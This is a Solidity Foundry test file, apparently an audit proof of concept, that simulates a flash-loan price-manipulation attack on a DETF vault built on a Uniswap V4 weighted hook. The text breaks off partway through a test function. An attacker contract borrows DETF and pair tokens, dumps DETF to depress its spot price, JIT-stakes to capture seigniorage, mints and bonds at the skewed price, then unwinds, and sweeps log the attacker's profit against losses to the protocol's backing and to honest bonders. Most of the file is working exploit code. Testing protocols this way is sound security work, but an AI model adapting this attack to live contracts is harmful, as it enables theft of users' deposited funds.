// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ExchangeInAmount} from "contracts/utils/ExchangeInAmount.sol";

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPermit2} from "@crane/contracts/interfaces/protocols/utils/permit2/IPermit2.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {ArtifactCreationCode} from "contracts/utils/foundry/ArtifactCreationCode.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {IStakedDETF, IDETFFundedRewards} from "contracts/interfaces/IStakedDETF.sol";
import {DETFFundedStakingMath} from "contracts/vaults/detf/common/core/DETFFundedStakingMath.sol";
import {IUniswapV4SeBufferHook} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4SeBufferHook.sol";
import {IUniswapV4HookStagedPairInit} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4HookStagedPairInit.sol";
import {IUniswapV4StandardExchangeWeightedBufferHookPackage} from
    "contracts/hooks/uniswap/v4/standardExchange/weighted/interfaces/IUniswapV4StandardExchangeWeightedBufferHookPackage.sol";
import {UniswapV4StandardExchangeWeightedBufferHook_FactoryService as WeightedFactory} from
    "contracts/hooks/uniswap/v4/standardExchange/weighted/UniswapV4StandardExchangeWeightedBufferHook_FactoryService.sol";
import {RateProviderFixtureLib} from "contracts/test/libs/RateProviderFixtureLib.sol";
import {HookPkgArgsDecimalsLib} from "contracts/test/libs/HookPkgArgsDecimalsLib.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {SimpleYieldERC4626} from "contracts/test/stubs/SimpleYieldERC4626.sol";
import {TestBase_ERC4626StandardExchange} from "contracts/test/bases/TestBase_ERC4626StandardExchange.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {IUniswapV4Detf} from "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/interfaces/IUniswapV4Detf.sol";
import {TestBase_UniswapV4Detf_Weighted} from
    "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf_Weighted.sol";

interface IBondEntryC {
    function bond(IERC20 tokenIn, uint256 amountIn, uint256 lockDuration, address recipient, bool pretransferred, uint256 deadline)
        external returns (uint256 tokenId, uint256 shares);
}

/// @notice Simulated flash lender of DETF (honest holder lending inventory). Principal + 0.10% fee back in-tx.
contract ChainDetfLender {
    IERC20 public immutable detf;
    uint256 public constant FEE_BPS = 10;

    constructor(IERC20 detf_) { detf = detf_; }

    function flashLoan(uint256 amount) external {
        uint256 before_ = detf.balanceOf(address(this));
        uint256 fee_ = amount * FEE_BPS / 10_000 + 1;
        detf.transfer(msg.sender, amount);
        ChainDetfAttacker(msg.sender).onChainFlash(amount, fee_);
        require(detf.balanceOf(address(this)) >= before_ + fee_, "flash not repaid");
    }
}

/// @notice Simulated flash lender of pair1 (stands in for a V4 PoolManager flash of WETH/DTF). 0.05% fee.
contract ChainPairLender {
    IERC20 public immutable tok;
    uint256 public constant FEE_BPS = 5;
    constructor(IERC20 t) { tok = t; }
    function flashLoan(uint256 amount) external {
        uint256 before_ = tok.balanceOf(address(this));
        uint256 fee_ = amount * FEE_BPS / 10_000 + 1;
        tok.transfer(msg.sender, amount);
        ChainDetfAttacker(msg.sender).onPairFlash(amount, fee_);
        require(tok.balanceOf(address(this)) >= before_ + fee_, "pair flash not repaid");
    }
}

/// @notice Unprivileged attacker: public hook / DETF / sDETF / bond-NFT entrypoints only.
contract ChainDetfAttacker {
    struct Cfg {
        uint256 delta;    // DETF dumped into the third leg (DETF -> pair1)
        uint256 stake;    // DETF JIT-staked across the mint/bond (seigniorage pot capture)
        uint256 aMint;    // pair0 minted through DETF.exchangeIn
        uint256 chunks;   // number of mint chunks
        uint256 bBond;    // pair0 bonded
        uint256 lock;     // bond lock
        uint256 bondChunks; // bonds split into N calls (0/1 = single)
        uint256 drainP1;  // pair1 flash-borrowed and swapped into the pool for pair0 (lowers reservePair0)
        bool dumpLeg0;    // original detf-bond-spot strategy: dump DETF against pair0 (not the third leg)
        bool mintWithP1;  // mint through the untouched pair1 leg (its gate reads only pair1 reserve)
        bool bondFirst;   // bond before minting (mint's single-sided pair0 join would shrink g)
    }

    IERC20 immutable detf;
    address immutable hook;
    IERC20 immutable p0;
    IERC20 immutable p1;
    ChainDetfLender immutable lender;
    ChainPairLender public pairLender;
    IStakedDETF immutable st;
    IDetfBondNFT immutable nft;

    Cfg cfg;
    uint256 public bondId;
    uint256[] public bondIds;
    function nBonds() external view returns (uint256) { return bondIds.length; }
    uint256 public minted;
    uint256 public stakeGain;
    bool public gateOpen;

    constructor(address detf_, address hook_, IERC20 p0_, IERC20 p1_, ChainDetfLender lender_, address st_, address nft_) {
        detf = IERC20(detf_); hook = hook_; p0 = p0_; p1 = p1_; lender = lender_;
        st = IStakedDETF(st_); nft = IDetfBondNFT(nft_);
        IERC20(detf_).approve(hook_, type(uint256).max);
        IERC20(detf_).approve(st_, type(uint256).max);
        p0_.approve(hook_, type(uint256).max);
        p1_.approve(hook_, type(uint256).max);
        p0_.approve(detf_, type(uint256).max);
        p1_.approve(detf_, type(uint256).max);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function _dl() internal view returns (uint256) { return block.timestamp + 1 hours; }
    function _res(address t) internal view returns (uint256 r) {
        uint256[] memory amts = IUniswapV4SeBufferHook(hook).previewExitProportional(IERC20(hook).totalSupply());
        address[] memory toks = IUniswapV4SeBufferHook(hook).tokens();
        for (uint256 i; i < toks.length; ++i) if (toks[i] == t) r = amts[i];
    }
    function _hookDetf() internal view returns (uint256) { return detf.balanceOf(hook); }

    function _sellDetf(IERC20 out_, uint256 amt) internal {
        while (amt > 0) {
            uint256 c = _hookDetf() / 5;
            if (c > amt) c = amt;IStandardExchangeIn(hook).exchangeIn(detf, c, out_, 0, address(this), false, _dl());
            amt -= c;
        }
    }

    function _buyDetfWith(IERC20 in_, uint256 amt) internal {
        while (amt > 0) {
            uint256 c = _hookDetf() / 10;
            if (c > amt) c = amt;
            IStandardExchangeOut(hook).exchangeOut(in_, type(uint256).max, detf, c, address(this), false, _dl());
            amt -= c;
        }
    }

    function setPairLender(ChainPairLender pl) external { pairLender = pl; }

    uint256 pairFee;

    function run(Cfg calldata c) external {
        cfg = c;
        if (c.drainP1 > 0) pairLender.flashLoan(c.drainP1);
        else _detfStage();
    }

    function onPairFlash(uint256 amount, uint256 fee) external {
        require(msg.sender == address(pairLender), "pl only");
        pairFee = fee;
        _detfStage();
        p1.transfer(address(pairLender), amount + fee);
    }

    function _detfStage() internal {
        uint256 borrow = cfg.delta + cfg.stake;
        if (borrow == 0) _core(0);
        else lender.flashLoan(borrow);
    }

    function onChainFlash(uint256 amount, uint256 fee) external {
        require(msg.sender == address(lender), "lender only");
        _core(fee);
        detf.transfer(address(lender), amount + fee);
    }

    function _core(uint256 fee) internal {
        Cfg memory c = cfg;
        uint256 p1Start = p1.balanceOf(address(this)) + pairFee; // pair1 flash fee must be produced too
        // -1) drain pair0 reserve with flash-borrowed pair1 (chunked under MaxInRatio)
        if (c.drainP1 > 0) {
            uint256 left = c.drainP1;
            while (left > 0) {
                uint256 ch = _res(address(p1)) / 5;
                if (ch == 0) break;
                if (ch > left) ch = left;IStandardExchangeIn(hook).exchangeIn(p1, ch, p0, 0, address(this), false, _dl());
                left -= ch;
            }
        }
        // 0) JIT stake (bond-NFT principal also stakes; seigniorage pots rebase instantly)
        if (c.stake > 0) {IStandardExchangeIn(address(st)).exchangeIn(detf, c.stake, IERC20(address(st)), 0, address(this), false, _dl());
        }
        // 1) depress DETF spot through the third leg; pair0 gate only reads pair0 leg
        if (c.delta > 0) _sellDetf(c.dumpLeg0 ? p0 : p1, c.delta);
        if (c.bondFirst) { _doBond(c); _doMint(c); } else { _doMint(c); _doBond(c); }
        // 4) unstake JIT position
        if (c.stake > 0) {
            uint256 b = IERC20(address(st)).balanceOf(address(this));(uint256 got,) = IStandardExchangeIn(address(st)).exchangeIn(IERC20(address(st)), b, detf, 0, address(this), false, _dl());
            stakeGain = got > c.stake ? got - c.stake : 0;
        }
        // 5) buy back the dumped DETF (+ fee) with pair1
        if (c.delta > 0) _buyDetfWith(c.dumpLeg0 ? p0 : p1, c.delta + fee);
        // 6) settle DETF: keep exactly the repayment, sell surplus for pair0 (or buy deficit with pair0)
        uint256 keep = c.delta + c.stake + fee;
        uint256 bal = detf.balanceOf(address(this));
        if (bal > keep) _sellDetf(p0, bal - keep);
        else if (bal < keep) _buyDetfWith(p0, keep - bal);
        // 7) restore pair1 inventory against pair0
        uint256 p1Now = p1.balanceOf(address(this));
        while (p1Now < p1Start) {
            uint256 need = p1Start - p1Now;
            uint256 cap = _res(address(p1)) / 8;
            if (need > cap) need = cap;
            IStandardExchangeOut(hook).exchangeOut(p0, type(uint256).max, p1, need, address(this), false, _dl());
            p1Now = p1.balanceOf(address(this));
        }
        if (p1Now > p1Start) {IStandardExchangeIn(hook).exchangeIn(p1, p1Now - p1Start, p0, 0, address(this), false, _dl());
        }
    }

    function _doMint(Cfg memory c) internal {
        if (c.aMint > 0) {
            IERC20 mt = c.mintWithP1 ? p1 : p0;
            gateOpen = IUniswapV4Detf(address(detf)).isMintingAllowed(mt);
            uint256 per = c.aMint / c.chunks;
            for (uint256 i; i < c.chunks; ++i) {minted += ExchangeInAmount.exchangeOut(IStandardExchangeIn(address(detf)), IERC20(address(mt)), per, IERC20(address(detf)), 0, address(this), false, _dl());
            }
        }
    }

    function _doBond(Cfg memory c) internal {
        if (c.bBond > 0) {
            uint256 n = c.bondChunks == 0 ? 1 : c.bondChunks;
            for (uint256 i; i < n; ++i) {
                (uint256 id,) = IBondEntryC(address(detf)).bond(p0, c.bBond / n, c.lock, address(this), false, _dl());
                bondIds.push(id);
            }
            bondId = bondIds[0];
        }
    }

    /// @notice after the lock: claim bond (sDETF), unstake, sell everything for pair0
    function realize() external returns (uint256 principal, uint256 rewards) {
        if (bondId != 0) {
            IDETFFundedRewards(address(detf)).synchronizeRewards();
            for (uint256 i; i < bondIds.length; ++i) {
                (uint256 pr, uint256 rw) = nft.claimBond{gas: 30_000_000}(bondIds[i], address(this));
                principal += pr; rewards += rw;
            }
            uint256 b = IERC20(address(st)).balanceOf(address(this));if (b > 0) IStandardExchangeIn(address(st)).exchangeIn(IERC20(address(st)), b, detf, 0, address(this), false, _dl());
        }
        uint256 d = detf.balanceOf(address(this));
        if (d > 0) _sellDetf(p0, d);
    }
}

/// @notice Product as deployed by scripts/foundry/anvil_robinhood_main: DETF over a 3-token weighted buffer hook
/// (DETF 60 / pair0 20 / pair1 20, each pair leg behind an SE vault), bond NFT + sDETF staking,
/// FixtureEconomics fees (dexSwap 0.03%, seigniorage 5%), bond terms 1d..180d, 0..50% bonus.
contract ChainDetfSystemTest is TestBase_UniswapV4Detf_Weighted {
    ChainDetfLender lender;
    address honestMinter = address(0xBEEF01);
    address honestBonder = address(0xB0B0);
    uint256 honestBondId;
    uint256 firstBondId;
    uint256 constant MINLOCK = 1 days;
    uint256 constant MAXLOCK = 180 days;
    uint256 mintThr; // 0 = fixture (always open); deployed json = 1.05e18
    uint256 burnThr;

    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        vm.etch(PERMIT2_ADDR, address(permit2).code);
        permit2 = IPermit2(PERMIT2_ADDR);
        pair0 = new SimpleMintableERC20("Pair0", "P0");
        pair1 = new SimpleMintableERC20("Pair1", "P1");
        pairToken = pair0;
        se0 = _deployERC4626SE(address(new SimpleYieldERC4626(pair0)));
        se1 = _deployERC4626SE(address(new SimpleYieldERC4626(pair1)));
        se = se0;
        pm = IPoolManager(create3Factory.create3WithArgs(
            ArtifactCreationCode.creationCode(create3Factory, "PoolManager.sol:PoolManager"),
            abi.encode(address(this)),
            keccak256("TestBase_UniswapV4Detf_Weighted_PoolManager")
        ));
        _deployHookFactory();
        _deployWeightedHookPkg();
        _deployBondNftVaultPkg();
        _deployRebasingClaimTokenPkg();
        _deployDetfPkg();
        _setDefaultBondTerms(MINLOCK, MAXLOCK);
        IUniswapV4Detf.PkgArgs memory args = _nLegDetfArgs(2);
        args.mintThreshold = _mintThrArg();
        args.burnThreshold = _burnThrArg();
        address predicted_ = _deployHook602020(args);
        vm.startPrank(owner);
        detf = detfPkg.deployVault(args);
        vm.stopPrank();
        require(detf == predicted_, "detf != predicted");
        detfInfo = IUniswapV4Detf(detf);
        detfExchangeIn = IStandardExchangeIn(detf);
        _setBondTerms(MINLOCK, MAXLOCK);
        pair0.mint(detfUser, 10_000_000 ether);
        pair1.mint(detfUser, 10_000_000 ether);
        vm.startPrank(detfUser);
        pair0.approve(detf, type(uint256).max);
        pair1.approve(detf, type(uint256).max);
        vm.stopPrank();
    }

    function _mintThrArg() internal view virtual returns (uint256) { return 0; }
    function _burnThrArg() internal view virtual returns (uint256) { return 0; }

    function _deployHook602020(IUniswapV4Detf.PkgArgs memory args) internal returns (address predicted_) {
        predicted_ = _predictDetf(args);
        address[] memory toks = new address[](3);
        toks[0] = predicted_; toks[1] = address(pair0); toks[2] = address(pair1);
        _sortInPlace(toks);
        uint256[] memory w = new uint256[](3);
        address[] memory ses = new address[](3);
        for (uint256 i; i < 3; ++i) {
            if (toks[i] == predicted_) { ses[i] = address(0); w[i] = 6e17; }
            else if (toks[i] == address(pair0)) { ses[i] = se0; w[i] = 2e17; }
            else { ses[i] = se1; w[i] = 2e17; }
        }
        IUniswapV4StandardExchangeWeightedBufferHookPackage.PkgArgs memory hArgs =
            IUniswapV4StandardExchangeWeightedBufferHookPackage.PkgArgs({
                poolManager: address(pm),
                feeOracle: address(indexedexManager),
                n: 3,
                tokens: toks,
                weights: w,
                standardExchanges: ses,
                rateProviders: RateProviderFixtureLib.providersFor(create3Factory, diamondPackageFactory, toks, ses),
                tokenDecimals: HookPkgArgsDecimalsLib.tokenDecimals(toks, predicted_),
                seDecimals: HookPkgArgsDecimalsLib.seDecimals(ses),
                ownerOnlyLiquidity: args.ownerOnlyLiquidity,
                owner: predicted_
            });
        uint256 mineNonce = WeightedFactory.findMineNonce(hookFactory, weightedHookPkg, hArgs);
        reserveHook = WeightedFactory.deployHook(weightedHookPkg, hArgs, mineNonce);
        IUniswapV4HookStagedPairInit init = IUniswapV4HookStagedPairInit(reserveHook);
        init.deployPair(toks[0], toks[1]);
        init.deployPair(toks[0], toks[2]);
        init.deployPair(toks[1], toks[2]);
        require(init.finalizeInitialization(), "finalize");
        args.hook = reserveHook;
    }

    /* ------------------------------ honest state ------------------------------ */

    uint256 nHonestMints = 60;

    function _setupHonest() internal {
        vm.startPrank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setVaultDexSwapFee(detfInfo.hook(), 3e14);
        IVaultFeeOracleManager(address(indexedexManager)).setDefaultSeigniorageIncentivePercentage(5e16);
        vm.stopPrank();
        // first bond seeds the reserve (honest)
        vm.startPrank(detfUser);
        (firstBondId,) = detfInfo.bond(IERC20(address(pair0)), 1_000 ether, MAXLOCK, detfUser, false, block.timestamp + 1 hours);
        vm.stopPrank();
        require(detfInfo.isReserveLive(), "live");
        // honest minter: normal mints, inventory lent through the flash lender
        lender = new ChainDetfLender(IERC20(detf));
        pair0.mint(honestMinter, 1_000_000 ether);
        vm.startPrank(honestMinter);
        pair0.approve(detf, type(uint256).max);
        for (uint256 i; i < nHonestMints; ++i) {detfExchangeIn.exchangeIn(IERC20(address(pair0)), 100 ether, IERC20(detf), 0, honestMinter, false, block.timestamp + 1 hours);
        }
        IERC20(detf).transfer(address(lender), IERC20(detf).balanceOf(honestMinter));
        vm.stopPrank();
        // an honest 90d bonder (staked principal shares seigniorage pots)
        pair0.mint(honestBonder, 1_000 ether);
        vm.startPrank(honestBonder);
        pair0.approve(detf, type(uint256).max);
        (honestBondId,) = detfInfo.bond(IERC20(address(pair0)), 300 ether, 90 days, honestBonder, false, block.timestamp + 1 hours);
        vm.stopPrank();
    }

    function _nft() internal view returns (IDetfBondNFT) { return IDetfBondNFT(detfInfo.bondNftVault()); }

    function _spotDetfIn(IERC20 p) internal view returns (uint256) {(uint256 quotedAmountOut,) = IStandardExchangeIn(reserveHook).previewExchangeIn(IERC20(detf), 1e6, p);
    return quotedAmountOut; // pair wei per 1e6 DETF wei
    }

    uint256 s0; uint256 s1; // pre-attack reference spots

    function _protocolBacking() internal view returns (uint256 v) {
        address hook_ = detfInfo.hook();
        address bnft = detfInfo.bondNftVault();
        uint256 lp = IERC20(hook_).balanceOf(detf) + (bnft == address(0) ? 0 : IERC20(hook_).balanceOf(bnft));
        uint256[] memory amts = IUniswapV4SeBufferHook(hook_).previewExitProportional(lp);
        address[] memory toks = IUniswapV4SeBufferHook(hook_).tokens();
        for (uint256 i; i < toks.length; ++i) {
            if (toks[i] == address(pair0)) v += amts[i];
            else if (toks[i] == address(pair1)) v += amts[i] * s0 / s1; // pair1 at pre-attack cross price
        }
    }

    function _bonderValue(uint256 id) internal view returns (uint256) {
        DETFFundedStakingMath.BondClaim memory c = _nft().previewClaim(id);
        return c.principalRemaining + c.rewardsDue;
    }

    struct R {
        int256 txPnl;       // pair0 delta right after the attack tx (bond not yet realized)
        int256 realPnl;     // pair0 delta after lock + full realization (sell all DETF)
        uint256 principal;
        uint256 minted;
        uint256 stakeGain;
        int256 backingDelta;
        int256 bonderDelta; // honest 90d bonder value (DETF) delta across the attack tx
        int256 firstBonderDelta;
    }

    function _scn(string memory tag, ChainDetfAttacker.Cfg memory c) internal returns (R memory r) {
        ChainDetfAttacker atk = new ChainDetfAttacker(
            detf, reserveHook, IERC20(address(pair0)), IERC20(address(pair1)), lender,
            detfInfo.rebasingClaimToken(), detfInfo.bondNftVault()
        );
        pair0.mint(address(atk), c.aMint * (c.mintWithP1 ? 10 : 1) + c.bBond + 300 ether); // own capital (accounted)
        pair1.mint(address(atk), 100 ether + (c.mintWithP1 ? c.aMint : 0)); // pair1 float, must be restored
        if (c.drainP1 > 0) {
            ChainPairLender pl = new ChainPairLender(IERC20(address(pair1)));
            pair1.mint(address(pl), c.drainP1); // honest pair1 liquidity (stands in for V4 flash)
            atk.setPairLender(pl);
        }
        uint256 p0Before = pair0.balanceOf(address(atk));
        uint256 p1Before = pair1.balanceOf(address(atk));
        uint256 lenderBefore = IERC20(detf).balanceOf(address(lender));
        uint256 backB = _protocolBacking();
        uint256 hbB = _bonderValue(honestBondId);
        uint256 fbB = _bonderValue(firstBondId);

        vm.prank(address(0xA77AC4), address(0xA77AC4));
        atk.run(c);

        assertGe(pair1.balanceOf(address(atk)), p1Before, "pair1 restored");
        assertEq(IERC20(detf).balanceOf(address(atk)), 0, "no liquid DETF left");
        assertGe(IERC20(detf).balanceOf(address(lender)), lenderBefore, "loan repaid + fee");
        r.txPnl = int256(pair0.balanceOf(address(atk))) - int256(p0Before);
        r.backingDelta = int256(_protocolBacking()) - int256(backB);
        r.bonderDelta = int256(_bonderValue(honestBondId)) - int256(hbB);
        r.firstBonderDelta = int256(_bonderValue(firstBondId)) - int256(fbB);
        r.minted = atk.minted();
        r.stakeGain = atk.stakeGain();
        for (uint256 i; i < atk.nBonds(); ++i) r.principal += _nft().positionOf(atk.bondIds(i)).principal;
        uint256 sp0After = _spotDetfIn(IERC20(address(pair0)));

        // realize after the lock with no other market activity
        if (atk.bondId() != 0) vm.warp(block.timestamp + c.lock + 1);
        atk.realize();
        assertGe(pair1.balanceOf(address(atk)), p1Before, "pair1 still restored");
        r.realPnl = int256(pair0.balanceOf(address(atk))) - int256(p0Before);

        console2.log(string.concat("== ", tag, " =="));
        console2.log("  delta / stake", c.delta, c.stake);
        console2.log("  aMint / bBond", c.aMint, c.bBond);
        console2.log("  gate open at mint", atk.gateOpen());
        console2.log("  minted user DETF / bond principal", r.minted, r.principal);
        console2.log("  JIT stake gain (DETF)", r.stakeGain);
        console2.log("  spot DETF->pair0 pre/after-tx", s0, sp0After);
        console2.log("  attacker pair0 PnL after tx (bond unrealized):");
        console2.logInt(r.txPnl);
        console2.log("  attacker REALIZED pair0 PnL (after lock, all sold):");
        console2.logInt(r.realPnl);
        console2.log("  protocol-LP pair backing delta (pair0 units):");
        console2.logInt(r.backingDelta);
        console2.log("  honest 90d bonder value delta (DETF):");
        console2.logInt(r.bonderDelta);
        console2.log("  first bonder value delta (DETF):");
        console2.logInt(r.firstBonderDelta);
    }

    function _cfg(uint256 d, uint256 s, uint256 a, uint256 b) internal pure returns (ChainDetfAttacker.Cfg memory c) {
        c = ChainDetfAttacker.Cfg({delta: d, stake: s, aMint: a, chunks: 1, bBond: b, lock: MINLOCK, bondChunks: 1, drainP1: 0, dumpLeg0: false, mintWithP1: false, bondFirst: false});
    }

    function _logState() internal view {
        console2.log("hook DETF bal", IERC20(detf).balanceOf(reserveHook));
        console2.log("DETF supply", IERC20(detf).totalSupply());
        console2.log("lender DETF", IERC20(detf).balanceOf(address(lender)));
        console2.log("sDETF supply", IERC20(detfInfo.rebasingClaimToken()).totalSupply());
        console2.log("synthetic", detfInfo.syntheticPrice());
        console2.log("mint allowed p0", detfInfo.isMintingAllowed(IERC20(address(pair0))));
        console2.log("protocol backing (pair0)", _protocolBacking());
    }

    /* --------------------------------- tests --------------------------------- */

    uint256 A = 60 ether;
    uint256 B = 60 ether;

    function test_chain_composite() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        _logState();
        uint256 hookDetf = IERC20(detf).balanceOf(reserveHook);
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        uint256 d = hookDetf * 60 / 100;
        if (d > lend * 70 / 100) d = lend * 70 / 100;
        uint256 s = lend - d;

        uint256 snap = vm.snapshotState();
        R memory hon = _scn("BASELINE honest mint A + bond B (no flash)", _cfg(0, 0, A, B));
        vm.revertToState(snap); snap = vm.snapshotState();
        R memory mOnly = _scn("PRIMITIVE spot-mint (dump d, mint A)", _cfg(d, 0, A, 0));
        vm.revertToState(snap); snap = vm.snapshotState();
        R memory bOnly = _scn("PRIMITIVE bond-spot via third leg (dump d, bond B)", _cfg(d, 0, 0, B));
        vm.revertToState(snap); snap = vm.snapshotState();
        R memory hBond = _scn("BASELINE honest bond B only", _cfg(0, 0, 0, B));
        vm.revertToState(snap); snap = vm.snapshotState();
        R memory mb = _scn("COMPOSITE dump d + mint A + bond B", _cfg(d, 0, A, B));
        vm.revertToState(snap); snap = vm.snapshotState();
        R memory full = _scn("COMPOSITE+JIT stake s + dump d + mint A + bond B", _cfg(d, s, A, B));
        vm.revertToState(snap);

        console2.log("SUMMARY realized pair0 PnL: honest(A+B), mintOnly, bondOnly, honestBond, mint+bond, full");
        console2.logInt(hon.realPnl);
        console2.logInt(mOnly.realPnl);
        console2.logInt(bOnly.realPnl);
        console2.logInt(hBond.realPnl);
        console2.logInt(mb.realPnl);
        console2.logInt(full.realPnl);
        int256 best = mOnly.realPnl > bOnly.realPnl ? mOnly.realPnl : bOnly.realPnl;
        console2.log("composite(full) - best single primitive:");
        console2.logInt(full.realPnl - best);
        console2.log("composite(full) - (best single + honest-bond baseline):");
        console2.logInt(full.realPnl - best - hBond.realPnl);
    }

    function _poolPairValue() internal view returns (uint256 v) {
        uint256[] memory amts = IUniswapV4SeBufferHook(reserveHook).previewExitProportional(IERC20(reserveHook).totalSupply());
        address[] memory toks = IUniswapV4SeBufferHook(reserveHook).tokens();
        for (uint256 i; i < toks.length; ++i) {
            if (toks[i] == address(pair0)) v += amts[i];
            else if (toks[i] == address(pair1)) v += amts[i] * s0 / s1;
        }
    }

    /// @notice Sweep bond size / mint size / dump size. Each row: realized attacker PnL vs honest same-capital baseline.
    function test_chain_sweep() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        uint256[3] memory dF = [uint256(35), 70, 100];
        uint256[3] memory bs = [uint256(1000 ether), 3000 ether, 6000 ether];
        uint256[2] memory as_ = [uint256(0), 300 ether];
        for (uint256 k; k < 2; ++k) for (uint256 j; j < 3; ++j) {
            uint256 snap = vm.snapshotState();
            uint256 pv0 = _poolPairValue();
            ChainDetfAttacker.Cfg memory hc = _cfg(0, 0, as_[k], bs[j]);
            hc.bondChunks = bs[j] / 500 ether; hc.chunks = as_[k] > 0 ? 3 : 1;
            R memory h;
            try this.ext_scn(hc) returns (int256 hp) { h.realPnl = hp; } catch { console2.log("honest reverted"); }
            vm.revertToState(snap);
            for (uint256 i; i < 3; ++i) {
                snap = vm.snapshotState();
                pv0 = _poolPairValue();
                ChainDetfAttacker.Cfg memory ac = _cfg(lend * dF[i] / 100, 0, as_[k], bs[j]);
                ac.bondChunks = hc.bondChunks; ac.chunks = hc.chunks;
                try this.ext_scn(ac) returns (int256 rp) {
                    console2.log("ROW dPct,aMint,bBond", dF[i], as_[k] / 1e18, bs[j] / 1e18);
                    console2.log("ROW realized attack, honest, excess:");
                    console2.logInt(rp);
                    console2.logInt(h.realPnl);
                    console2.logInt(rp - h.realPnl);
                    console2.log("ROW pool pair value delta after realization:");
                    console2.logInt(int256(_poolPairValue()) - int256(pv0));
                } catch (bytes memory err) {
                    console2.log("ROW REVERTED dPct,aMint,bBond", dF[i], as_[k] / 1e18, bs[j] / 1e18);
                    console2.logBytes(err);
                }
                vm.revertToState(snap);
            }
        }
    }

    function ext_scn(ChainDetfAttacker.Cfg memory c) external returns (int256) {
        require(msg.sender == address(this));
        return _scn("SWEEP attack", c).realPnl;
    }

    /// @notice No DETF inventory needed: flash pair1 (external asset), buy pair0 out of the pool, bond, restore.
    function test_chain_pairDrain() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        uint256 hp1 = _reserveOf(address(pair1));
        console2.log("pool pair1 (approx, idle+SE)", hp1);
        uint256[3] memory dr = [hp1 * 15 / 100, hp1 * 30 / 100, hp1 * 50 / 100];
        uint256[2] memory bs = [uint256(500 ether), 1000 ether];
        for (uint256 j; j < 2; ++j) {
            uint256 snap = vm.snapshotState();
            ChainDetfAttacker.Cfg memory hc = _cfg(0, 0, 0, bs[j]); hc.bondChunks = bs[j] / 500 ether;
            int256 hpnl;
            try this.ext_scn(hc) returns (int256 x) { hpnl = x; } catch { console2.log("honest reverted"); }
            vm.revertToState(snap);
            for (uint256 i; i < 3; ++i) {
                snap = vm.snapshotState();
                uint256 pv0 = _poolPairValue();
                ChainDetfAttacker.Cfg memory ac = _cfg(0, 0, 0, bs[j]); ac.bondChunks = hc.bondChunks; ac.drainP1 = dr[i];
                try this.ext_scn(ac) returns (int256 rp) {
                    console2.log("DRAIN drainP1(wei),bBond", dr[i], bs[j] / 1e18);
                    console2.log("DRAIN realized attack, honest, excess:");
                    console2.logInt(rp); console2.logInt(hpnl); console2.logInt(rp - hpnl);
                    console2.log("DRAIN pool pair value delta:");
                    console2.logInt(int256(_poolPairValue()) - int256(pv0));
                } catch (bytes memory err) {
                    console2.log("DRAIN REVERTED drainP1,bBond", dr[i] / 1e18, bs[j] / 1e18);
                    console2.logBytes(err);
                }
                vm.revertToState(snap);
            }
        }
    }

    function _backingPerCircDetf() internal view returns (uint256) {
        uint256 circ = IERC20(detf).totalSupply() - _reserveOf(detf);
        return _poolPairValue() * 1e9 / circ; // pair0 wei of reserve pair value per 1e9 circulating DETF
    }

    R[5] rs; // honest, mintOnly, bondOnly, composite, original bond-spot (pair0-leg dump)
    uint256 pv0; uint256 bpd0; uint256 pv1; uint256 bpd1;

    function _maxCfgs(uint256 lend) internal pure returns (ChainDetfAttacker.Cfg[5] memory c) {
        c[4] = _cfg(lend, 0, 0, 1000 ether); c[4].bondChunks = 2; c[4].dumpLeg0 = true;
        c[0] = _cfg(0, 0, 300 ether, 1000 ether); c[0].chunks = 3; c[0].bondChunks = 2;
        c[1] = _cfg(lend, 0, 300 ether, 0); c[1].chunks = 3;
        c[2] = _cfg(lend, 0, 0, 1000 ether); c[2].bondChunks = 2;
        c[3] = _cfg(lend, 0, 300 ether, 1000 ether); c[3].chunks = 3; c[3].bondChunks = 2;
    }

    /// @notice Headline: maximal composite found by the sweep, with assertions.
    function test_chain_max() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        _logState();
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        console2.log("flash DETF / pool DETF reserve (bps)", lend * 10_000 / _reserveOf(detf));
        pv0 = _poolPairValue();
        bpd0 = _backingPerCircDetf();
        console2.log("pool pair value (pair0 units) before", pv0);
        console2.log("backing per 1e9 circulating DETF before", bpd0);
        ChainDetfAttacker.Cfg[5] memory c = _maxCfgs(lend);
        string[5] memory tags = [
            "MAX baseline honest mint 300 + bond 1000",
            "MAX primitive spot-mint (full flash, mint 300)",
            "MAX primitive third-leg bond (full flash, bond 1000)",
            "MAX composite (full flash, mint 300 + bond 1000)",
            "MAX original detf-bond-spot strategy (full flash dumped vs pair0, bond 1000)"
        ];
        R[5] memory out;
        uint256[2] memory after_;
        for (uint256 j; j < 5; ++j) {
            uint256 i = j == 4 ? 3 : (j == 3 ? 4 : j); // run composite last so its end state persists
            uint256 snap = vm.snapshotState();
            out[i] = _scn(tags[i], c[i]);
            if (j < 4) vm.revertToState(snap);
        }
        after_[0] = _poolPairValue();
